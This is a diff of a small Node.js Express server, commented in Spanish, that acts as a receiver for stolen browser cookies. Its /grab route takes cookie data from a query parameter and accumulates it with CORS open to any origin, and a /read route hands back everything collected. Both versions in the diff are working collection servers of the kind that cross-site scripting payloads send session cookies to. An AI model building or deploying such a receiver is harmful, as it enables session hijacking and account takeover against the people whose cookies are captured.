@@ -1,44 +1,26 @@
 const express = require('express');
-const bodyParser = require('body-parser'); // Se utiliza para analizar y manejar las cookies que se envían desde el cliente hasta el servido
-const cors = require('cors');
-
 const app = express();
-let cookiesAlmacenadas = ""; // Variable para almacenar las cookies
+const cors = require('cors');
+app.use(cors());
 
-app.use(cors()); // Habilita CORS
-app.use(bodyParser.json());
+let cookiesAlmacenadas = "";  // Aquí se almacenarán las cookies
 
-// Ruta principal
 app.get('/', (req, res) => {
-    res.send('Página principal: siuuu');
+    res.send('pagina principal: siuuu');
 });
 
-// Ruta para grabar datos
+// Almacena las cookies enviadas
 app.get('/grab', (req, res) => {
     const data = req.query.data;
-    cookiesAlmacenadas += " " + data; // Almacena los datos
-    res.send(data);
+    cookiesAlmacenadas += data + "; ";  // Acumula las cookies
+    res.send(data);  // Envía una respuesta con las cookies que se acaban de almacenar
 });
 
-// Ruta para leer las cookies almacenadas
-//app.get('/read', (req, res) => {
-    //res.send(cookiesAlmacenadas);
-//});
-
-// Ruta para recibir y almacenar cookies
-app.get('/cookies', (req, res) => {
-    const cookies = req.query.cookies; // Obtener las cookies
-    cookiesAlmacenadas = cookies; // Almacenar las cookies
-    console.log('Cookies recibidas:', cookies);
-    res.send('Cookies recibidas correctamente');
+// Muestra todas las cookies almacenadas
+app.get('/read', (req, res) => {
+    res.send(cookiesAlmacenadas);  // Envía todas las cookies almacenadas
 });
 
-// Ruta para mostrar las cookies almacenadas
-app.get('/show-cookies', (req, res) => {
-  res.send(`Cookies almacenadas: ${cookiesAlmacenadas}`);
-});
-
-// Iniciar el servidor
 app.listen(3000, () => {
-    console.log('Servidor funcionando en el puerto 3000');
+    console.log('Servidor escuchando en el puerto 3000');
 });
